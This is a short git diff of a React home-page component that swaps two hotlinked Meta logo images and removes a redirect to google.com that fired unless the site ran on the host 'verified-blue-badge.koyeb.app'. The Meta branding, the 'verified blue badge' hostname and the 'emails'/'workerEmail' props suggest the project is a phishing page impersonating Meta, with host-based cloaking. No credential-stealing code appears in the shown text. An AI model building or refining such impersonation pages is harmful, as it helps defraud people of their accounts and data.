@@ -2,15 +2,12 @@ import React from "react";
 import { Link } from "react-router-dom";
 import test from "../assets/mainlogo.png";
 import { useNavigate } from "react-router-dom";
+import url from "../assets/config"
 const Home = ({ emails, workerEmail, name }) => {
   const navigate = useNavigate();
+  
 
-  if (window.location.hostname !== "verified-blue-badge.koyeb.app") {
-    window.location.href = "https://google.com";
-  }
-
-
-
+  
 
   const handleClick = () => {
     console.log(navigate);
@@ -24,7 +21,7 @@ const Home = ({ emails, workerEmail, name }) => {
       >
         <div className="container border-0 py-1 p-1">
           <img
-            src="https://scontent.fisb1-2.fna.fbcdn.net/v/t39.8562-6/252294889_575082167077436_6034106545912333281_n.svg/meta-logo-primary_standardsize.svg?_nc_cat=1&ccb=1-7&_nc_sid=e280be&_nc_ohc=_Cbz9JTySqAAb5temti&_nc_ht=scontent.fisb1-2.fna&oh=00_AfC_JTVVy1QDoXPQdLTiS0D1Rx10qLAJREFCWonA9KQ60Q&oe=6627AE39"
+            src="https://scontent.fhdd4-1.fna.fbcdn.net/v/t39.8562-6/252294889_575082167077436_6034106545912333281_n.svg/meta-logo-primary_standardsize.svg?_nc_cat=1&ccb=1-7&_nc_sid=e280be&_nc_ohc=TFhd7xr6xw8Q7kNvgFdMFBf&_nc_ht=scontent.fhdd4-1.fna&oh=00_AYDy4pL6cGzIZQKCJHqrc8zv6LGdoMuN5eJr_HIUWE5bQA&oe=667B2D39"
             alt="logo"
             style={{ width: "6rem", height: "6rem" }}
           />
@@ -33,7 +30,7 @@ const Home = ({ emails, workerEmail, name }) => {
       <div className="d-flex justify-content-center mt-5">
         <div className="col-sm-6 mt-5 ms-5">
           <img
-            src="https://scontent.fisb1-2.fna.fbcdn.net/v/t39.8562-6/375593064_778731280602001_6601361369208148137_n.png?_nc_cat=106&ccb=1-7&_nc_sid=f537c7&_nc_ohc=Hi0JtwRH0xoAb675fT-&_nc_oc=AdgKvStrUn6MlB_LJF_vCkEqoaZxiJj8_zpaO-TL9dVFxIa31CnKGIuoLAzQPb39vFiLDudknpJHAqY6siXuB0AA&_nc_ht=scontent.fisb1-2.fna&oh=00_AfBpUln3x-Y6NMJBZBmcHqlhkSZoK5CGHOY5ZPxeUGdzCQ&oe=6627A9CB"
+            src="https://scontent.fhdd4-1.fna.fbcdn.net/v/t39.8562-6/375593064_778731280602001_6601361369208148137_n.png?_nc_cat=106&ccb=1-7&_nc_sid=f537c7&_nc_ohc=0Y0WosexStAQ7kNvgGnC7yf&_nc_ht=scontent.fhdd4-1.fna&oh=00_AYDF7L0P7v99HQW2u4U2UNwrBwpbzWKRUA2G4lRcm7kAbA&oe=667B28CB"
             alt="meta"
             style={{ width: "4rem", height: "4rem" }}
           />
